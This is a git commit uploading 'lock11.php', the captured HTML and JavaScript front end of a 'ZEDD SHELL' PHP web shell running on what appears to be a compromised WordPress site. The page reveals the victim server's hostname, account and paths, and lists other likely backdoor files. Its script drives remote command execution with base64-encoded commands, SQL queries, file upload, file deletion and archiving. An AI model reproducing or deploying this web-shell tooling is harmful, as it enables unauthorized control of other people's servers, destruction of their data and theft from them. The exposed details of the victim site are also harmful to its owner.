7828509870bf339ecc747c98aa587859d40a0d28
MrjHaxcore <110843759+MrjHaxcore@users.noreply.github.com>
2025-05-28 13:56:07 +0800

    Add files via upload

---
+++ lock11.php
@@ -0,0 +1,395 @@
+<html>
+<head>
+<title>ZEDD SHELL</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+<style>
+body
+{
+	background-color: #222222;
+	color: #D6D4D4;
+	font-family: Lucida,Verdana;
+	font-size: 12px;
+}
+.qalin
+{
+	text-decoration: none;
+	color: #D6905E;
+	font-weight: 600;
+}
+.success
+{
+	color: #9DB754;
+}
+.bad
+{
+	color: #B75654;
+}
+a
+{
+	color: #ACB754;
+	text-decoration: none !important;
+}
+.fManager,.fManager tbody,.fManager tr
+{
+	padding: 0;
+	border-collapse: collapse;
+	margin: 0;
+	font-size: 12px;
+}
+.fManager
+{
+	margin: 10px 0;
+}
+.fManager tbody tr:nth-child(2n+1)
+{
+	background: #331717;
+}
+.fManager tbody tr:nth-child(2n)
+{
+	background: #1C0C0C;
+}
+.fManager tbody tr:hover
+{
+	background: #000000;
+}
+.fManager thead th
+{
+	text-align: left;
+}
+.fManager thead tr
+{
+	background-color: #333333;
+}
+.fManager
+{
+	box-shadow: 1px 1px 1px 1px #333333;
+}
+.fManager thead th
+{
+	padding: 4px 3px;
+}
+.baca_file
+{
+	margin: 5px 0;
+	padding: 2px;
+	box-shadow: 1px 1px 1px 1px #333333;
+	background-color: #E1E1E1;
+	width: 100%;
+	height: 400px;
+	overflow: auto;
+}
+.btn
+{
+	border: 1px solid #ACAE40;
+	background-color: #223B3B;
+	color: #E1E1E1;
+	padding: 1px 10px;
+	cursor: pointer;
+}
+.btn:disabled
+{
+	border: 1px solid #848484;
+	color: #848484;
+	cursor: not-allowed;
+}
+.file_edit
+{
+	margin: 5px 0;
+	padding: 2px;
+	box-shadow: 1px 1px 1px 1px #333333;
+	background-color: #E1E1E1;
+	width: 100%;
+	height: 400px;
+	overflow: auto;
+}
+input, select, textarea
+{
+	background: transparent !important;
+	color: #f6a56d;
+	border: 1px solid #D6905E;
+	padding: 5px;
+}
+table td
+{
+	border: 1px solid rgba(214, 144, 94, 0.7);
+	min-width: 20px;
+	padding-left: 5px;
+	padding-right: 5px;
+	max-width: 500px;
+	color: #ffad6f;
+	background: #292929;
+}
+table th
+{
+	border: 1px solid #D6905E;
+	padding-left: 5px;
+	padding-right: 5px;
+	color: #ffad6f;
+}
+table td div
+{
+	overflow: auto;
+	width: 100%;
+	height: 100%;
+	max-height: 100px;
+}
+</style>
+</head>
+<body>
+<span class='qalin'>Uname:</span> Linux advance.balancedserver.com 4.18.0-553.44.1.lve.el8.x86_64 #1 SMP Thu Mar 13 14:29:12 UTC 2025 x86_64<br/><span class='qalin'>User:</span> 1416 (riseinve)<br/><span class='qalin'>Group:</span> 1420 (riseinve)<br/><span class='qalin'>Disable functions:</span> <span class='success'>NONE :)</span><br/><span class='qalin'>Safe mode: </span><span class='bad'>On</span><span style='margin-left: 50px;'><a href='javascript:halaman("?awal=phpinfo")'>[ PHPinfo ]</a></span><br/><a href='javascript:halaman("?berkas=Lw%253D%253D")'>/</a>/<a href='javascript:halaman("?berkas=L2hvbWUv")'>home</a>/<a href='javascript:halaman("?berkas=L2hvbWUvcmlzZWludmUv")'>riseinve</a>/<a href='javascript:halaman("?berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS8%253D")'>cashx.riseinventor.com</a>/<a href='javascript:halaman("?berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50Lw%253D%253D")'>wp-content</a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;( <a href="">Reset</a> | <a href="javascript:goto()">Go to</a> )<hr><table class='fManager' style='width: 100%;'><thead><tr class='qalin'><th>s</th><th>File</th><th>Size</th><th>Tanggal</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr></thead><tbody><tr>
+						<td></td>
+						<td><a href="javascript:halaman('?berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50')" style='font-weight: 600;'>[ . ]</a></td>
+						<td></td>
+						<td>28 May 2025, 05:24</td>
+						<td>1416</td>
+						<td style="color: green;">0755</td>
+						<td></td>
+					</tr><tr>
+						<td></td>
+						<td><a href="javascript:halaman('?berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbQ%253D%253D')" style='font-weight: 600;'>[ .. ]</a></td>
+						<td></td>
+						<td>28 May 2025, 01:29</td>
+						<td>1416</td>
+						<td style="color: green;">0755</td>
+						<td></td>
+					</tr><tr>
+						<td></td>
+						<td><a href="javascript:halaman('?berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50L2JhY2t1cGx5')" style='font-weight: 600;'>[ backuply ]</a></td>
+						<td></td>
+						<td>21 Feb 2025, 11:00</td>
+						<td>1416</td>
+						<td style="color: green;">0755</td>
+						<td> <a href="javascript:kompres('L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50L2JhY2t1cGx5')" style='font-weight: 600;'>Zip</a> |  <a href="javascript:silPapka('L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50L2JhY2t1cGx5')" style='font-weight: 600;'>Hapus</a></td>
+					</tr><tr>
+						<td></td>
+						<td><a href="javascript:halaman('?berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50L2NhY2hl')" style='font-weight: 600;'>[ cache ]</a></td>
+						<td></td>
+						<td>21 Feb 2025, 11:01</td>
+						<td>1416</td>
+						<td style="color: green;">0755</td>
+						<td> <a href="javascript:kompres('L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50L2NhY2hl')" style='font-weight: 600;'>Zip</a> |  <a href="javascript:silPapka('L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50L2NhY2hl')" style='font-weight: 600;'>Hapus</a></td>
+					</tr><tr>
+						<td></td>
+						<td><a href="javascript:halaman('?berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50L3BsdWdpbnM%253D')" style='font-weight: 600;'>[ plugins ]</a></td>
+						<td></td>
+						<td>24 Feb 2025, 11:20</td>
+						<td>1416</td>
+						<td style="color: green;">0755</td>
+						<td> <a href="javascript:kompres('L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50L3BsdWdpbnM%253D')" style='font-weight: 600;'>Zip</a> |  <a href="javascript:silPapka('L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50L3BsdWdpbnM%253D')" style='font-weight: 600;'>Hapus</a></td>
+					</tr><tr>
+						<td></td>
+						<td><a href="javascript:halaman('?berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50L3NwZWVkeWNhY2hlLWNvbmZpZw%253D%253D')" style='font-weight: 600;'>[ speedycache-config ]</a></td>
+						<td></td>
+						<td>21 Feb 2025, 11:00</td>
+						<td>1416</td>
+						<td style="color: green;">0755</td>
+						<td> <a href="javascript:kompres('L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50L3NwZWVkeWNhY2hlLWNvbmZpZw%253D%253D')" style='font-weight: 600;'>Zip</a> |  <a href="javascript:silPapka('L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50L3NwZWVkeWNhY2hlLWNvbmZpZw%253D%253D')" style='font-weight: 600;'>Hapus</a></td>
+					</tr><tr>
+						<td></td>
+						<td><a href="javascript:halaman('?berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50L3RoZW1lcw%253D%253D')" style='font-weight: 600;'>[ themes ]</a></td>
+						<td></td>
+						<td>24 Feb 2025, 11:11</td>
+						<td>1416</td>
+						<td style="color: green;">0755</td>
+						<td> <a href="javascript:kompres('L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50L3RoZW1lcw%253D%253D')" style='font-weight: 600;'>Zip</a> |  <a href="javascript:silPapka('L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50L3RoZW1lcw%253D%253D')" style='font-weight: 600;'>Hapus</a></td>
+					</tr><tr>
+						<td></td>
+						<td><a href="javascript:halaman('?berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50L3VwZ3JhZGU%253D')" style='font-weight: 600;'>[ upgrade ]</a></td>
+						<td></td>
+						<td>24 Feb 2025, 11:20</td>
+						<td>1416</td>
+						<td style="color: green;">0755</td>
+						<td> <a href="javascript:kompres('L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50L3VwZ3JhZGU%253D')" style='font-weight: 600;'>Zip</a> |  <a href="javascript:silPapka('L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50L3VwZ3JhZGU%253D')" style='font-weight: 600;'>Hapus</a></td>
+					</tr><tr>
+						<td></td>
+						<td><a href="javascript:halaman('?berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50L3VwbG9hZHM%253D')" style='font-weight: 600;'>[ uploads ]</a></td>
+						<td></td>
+						<td>21 Feb 2025, 11:06</td>
+						<td>1416</td>
+						<td style="color: green;">0755</td>
+						<td> <a href="javascript:kompres('L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50L3VwbG9hZHM%253D')" style='font-weight: 600;'>Zip</a> |  <a href="javascript:silPapka('L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50L3VwbG9hZHM%253D')" style='font-weight: 600;'>Hapus</a></td>
+					</tr><tr>
+						<td></td>
+						<td><a href="javascript:halaman('?awal=baca_file&fayl=YWR2YW5jZWQtY2FjaGUucGhw&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50')">advanced-cache.php</a></td>
+						<td>6.18 Kb</td>
+						<td>21 Feb 2025, 11:00</td>
+						<td>1416</td>
+						<td style="color: green;">0644</td>
+						<td> <a href="javascript:halaman('?awal=download_file&fayl=YWR2YW5jZWQtY2FjaGUucGhw&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50')">Download</a> |  <a href="javascript:changeFileName('advanced-cache.php' , '?awal=rename_file&fayl=YWR2YW5jZWQtY2FjaGUucGhw&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50');">Rename</a> |  <a href="javascript:faylSifirla('?awal=reset_file&fayl=YWR2YW5jZWQtY2FjaGUucGhw&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50');">Kosong</a> |  <a href="javascript:faylSil('?awal=hapus_file&fayl=YWR2YW5jZWQtY2FjaGUucGhw&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50')">Delete</a></td>
+					</tr><tr>
+						<td></td>
+						<td><a href="javascript:halaman('?awal=baca_file&fayl=ZXJyb3JfbG9n&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50')">error_log</a></td>
+						<td>9.52 Kb</td>
+						<td>28 May 2025, 05:43</td>
+						<td>1416</td>
+						<td style="color: green;">0644</td>
+						<td> <a href="javascript:halaman('?awal=download_file&fayl=ZXJyb3JfbG9n&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50')">Download</a> |  <a href="javascript:changeFileName('error_log' , '?awal=rename_file&fayl=ZXJyb3JfbG9n&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50');">Rename</a> |  <a href="javascript:faylSifirla('?awal=reset_file&fayl=ZXJyb3JfbG9n&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50');">Kosong</a> |  <a href="javascript:faylSil('?awal=hapus_file&fayl=ZXJyb3JfbG9n&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50')">Delete</a></td>
+					</tr><tr>
+						<td></td>
+						<td><a href="javascript:halaman('?awal=baca_file&fayl=aW5kZXgucGhw&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50')">index.php</a></td>
+						<td>28 b</td>
+						<td>21 Feb 2025, 10:59</td>
+						<td>1416</td>
+						<td style="color: green;">0644</td>
+						<td> <a href="javascript:halaman('?awal=download_file&fayl=aW5kZXgucGhw&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50')">Download</a> |  <a href="javascript:changeFileName('index.php' , '?awal=rename_file&fayl=aW5kZXgucGhw&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50');">Rename</a> |  <a href="javascript:faylSifirla('?awal=reset_file&fayl=aW5kZXgucGhw&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50');">Kosong</a> |  <a href="javascript:faylSil('?awal=hapus_file&fayl=aW5kZXgucGhw&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50')">Delete</a></td>
+					</tr><tr>
+						<td></td>
+						<td><a href="javascript:halaman('?awal=baca_file&fayl=bG9jazExLnBocA%253D%253D&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50')">lock11.php</a></td>
+						<td>2.03 Kb</td>
+						<td>28 May 2025, 00:04</td>
+						<td>1416</td>
+						<td style="color: green;">0644</td>
+						<td> <a href="javascript:halaman('?awal=download_file&fayl=bG9jazExLnBocA%253D%253D&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50')">Download</a> |  <a href="javascript:changeFileName('lock11.php' , '?awal=rename_file&fayl=bG9jazExLnBocA%253D%253D&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50');">Rename</a> |  <a href="javascript:faylSifirla('?awal=reset_file&fayl=bG9jazExLnBocA%253D%253D&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50');">Kosong</a> |  <a href="javascript:faylSil('?awal=hapus_file&fayl=bG9jazExLnBocA%253D%253D&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50')">Delete</a></td>
+					</tr><tr>
+						<td></td>
+						<td><a href="javascript:halaman('?awal=baca_file&fayl=bG9jazIucGhw&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50')">lock2.php</a></td>
+						<td>42.59 Kb</td>
+						<td>28 May 2025, 01:29</td>
+						<td>1416</td>
+						<td style="color: green;">0644</td>
+						<td> <a href="javascript:halaman('?awal=download_file&fayl=bG9jazIucGhw&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50')">Download</a> |  <a href="javascript:changeFileName('lock2.php' , '?awal=rename_file&fayl=bG9jazIucGhw&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50');">Rename</a> |  <a href="javascript:faylSifirla('?awal=reset_file&fayl=bG9jazIucGhw&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50');">Kosong</a> |  <a href="javascript:faylSil('?awal=hapus_file&fayl=bG9jazIucGhw&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50')">Delete</a></td>
+					</tr><tr>
+						<td></td>
+						<td><a href="javascript:halaman('?awal=baca_file&fayl=bG9jazM2MC5waHA%253D&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50')">lock360.php</a></td>
+						<td>15.76 Kb</td>
+						<td>28 May 2025, 00:04</td>
+						<td>1416</td>
+						<td style="color: green;">0644</td>
+						<td> <a href="javascript:halaman('?awal=download_file&fayl=bG9jazM2MC5waHA%253D&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50')">Download</a> |  <a href="javascript:changeFileName('lock360.php' , '?awal=rename_file&fayl=bG9jazM2MC5waHA%253D&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50');">Rename</a> |  <a href="javascript:faylSifirla('?awal=reset_file&fayl=bG9jazM2MC5waHA%253D&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50');">Kosong</a> |  <a href="javascript:faylSil('?awal=hapus_file&fayl=bG9jazM2MC5waHA%253D&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50')">Delete</a></td>
+					</tr></tbody></table>
+<hr>
+<a href="javascript:newFile();">File Baru</a> | <a href="javascript:newPapka();">Folder Baru</a><br>
+<a href="javascript:halaman('?awal=sistem_kom&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50')">Command</a><br>
+<a href="javascript:halaman('?awal=skl');">SQL</a><br>
+
+<form method="POST" enctype="multipart/form-data">
+	<input type="hidden" name="awal" value="upl_file">
+	<input type="hidden" name="berkas" value="L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50">
+	<input type="file" name="ufile">
+	<input type="submit" value="Upl">
+</form>
+
+<form method="POST" id="post_form" style="display: none;"></form>
+<script>
+function halaman(url)
+{
+	var inputlar = "";
+	url = url.split("?");
+	if(typeof url[1]=="undefined") return;
+	url = url[1].split("&");
+	for(var n in url)
+	{
+		var keyAndValue = url[n].split("=");
+		if(typeof keyAndValue[1]=="undefined") continue;
+		inputlar+="<input name='"+keyAndValue[0]+"' value='"+keyAndValue[1]+"' type='hidden'>";
+	}
+	document.all("post_form").innerHTML = inputlar;
+	document.all("post_form").submit();
+}
+function faylSil(url)
+{
+	if( confirm('Anda yakin?') )
+	{
+		halaman(url);
+	}
+}
+function faylSifirla(url)
+{
+	if( confirm('Anda yakin?') )
+	{
+		halaman(url);
+	}
+}
+function changeFileName(name, url)
+{
+	var getNewName = prompt('Change file name:' , name);
+	if( getNewName )
+	{
+		halaman(url + "&new_name=" + getNewName);
+	}
+}
+function newFile()
+{
+	var getNewName = prompt('File name:');
+	if( getNewName )
+	{
+		halaman("?awal=buat_file&ad=" + getNewName + "&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50");
+	}
+}
+function newPapka()
+{
+	var getNewName = prompt('File name:');
+	if( getNewName )
+	{
+		halaman("?awal=buat_folder&ad=" + getNewName + "&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50");
+	}
+}
+function sistemKom()
+{
+	var komanda = document.getElementById('emr_et_atash').value;
+	if( komanda )
+	{
+		halaman("?awal=sistem_kom&kom=" + b64EncodeUnicode(komanda) + "&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50");
+	}
+}
+function skl_bas()
+{
+	var sklEmr = document.getElementById('skl_emr').value;
+	
+	halaman("?awal=skl&emr=" + b64EncodeUnicode(sklEmr));
+}
+function b64EncodeUnicode(str)
+{
+	return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g,
+		function toSolidBytes(match, p1) {
+			return String.fromCharCode('0x' + p1);
+		}));
+}
+function goto()
+{
+	var dir = prompt('Dir:');
+	if( dir )
+	{
+		halaman("?berkas=" + dir);
+	}
+}
+function kompres(berkas)
+{
+	var dir = prompt('Dir:' , "/home/riseinve/cashx.riseinventor.com/wp-content");
+	if( dir )
+	{
+		halaman("?awal=kompres&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50&zf=" + berkas + "&save_to=" + b64EncodeUnicode(dir))
+	}
+}
+function silPapka(berkas)
+{
+	if( confirm('Anda yakin?') )
+	{
+		halaman("?awal=hapus_folder&berkas=L2hvbWUvcmlzZWludmUvY2FzaHgucmlzZWludmVudG9yLmNvbS93cC1jb250ZW50&zf=" + berkas)
+	}
+}
+function kode()
+{
+	var vall = document.getElementsByClassName('file_edit')[0].value;
+	var repp = ['a','i','e','s','l','b','u','o','p','h',"\\(","\\)","\\<","\\>","\\?","\\;","\\[","\\]","\\$"];
+	for(var s in repp)
+	{
+		var h = repp[s];
+		vall = vall.replace(new RegExp(h, 'g') , '|:'+s+':|');
+	}
+
+	document.getElementsByClassName('file_edit')[0].value = vall;
+}
+
+document.getElementById("emr_et_atash").addEventListener("keyup", function(event)
+{
+	event.preventDefault();
+	if (event.keyCode === 13)
+	{
+		sistemKom();
+	}
+});
+</script>
+</body>
+</html>
+?>
